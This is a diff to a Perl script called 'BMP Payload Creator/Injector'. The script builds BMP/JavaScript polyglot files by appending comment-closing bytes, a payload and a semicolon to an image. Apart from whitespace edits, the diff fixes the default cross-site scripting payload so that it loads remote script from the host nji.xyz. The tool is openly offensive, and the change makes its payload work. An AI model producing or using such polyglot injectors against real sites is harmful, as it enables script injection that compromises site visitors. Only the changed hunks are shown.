@@ -10,7 +10,7 @@
 
 use strict;
 use warnings;
-use feature qw(say);
+use feature 'say';
 
 use Getopt::Long;
 
@@ -24,10 +24,10 @@ GetOptions(
     'payload=s' =>  \my $payload,
     'output=s'  =>  \my $outfile,
 );
-usage(0) if $help;
+usage(0)     if $help;
 usage(1) unless $outfile;
 
-$payload //= '<script src//nji.xyz></script>';
+$payload //= '<script src=//nji.xyz></script>';
 
 say <<EOF;
 [>|       BMP Payload Creator/Injector      |<]
@@ -36,10 +36,11 @@ say <<EOF;
 
 EOF
 
-create_bmp unless -f $outfile;
+create_bmp              unless -f $outfile;
+
 inject_payload;
 
-say `file $outfile`         if -f '/usr/bin/file';
+say `file       $outfile`   if -f '/usr/bin/file';
 say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
@@ -82,9 +83,7 @@ sub inject_payload {
     sysseek    $fh, 0, 2;
     
     syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
-
     syswrite   $fh, $payload;
-
     syswrite   $fh, "\x3b";
 
     close      $fh;
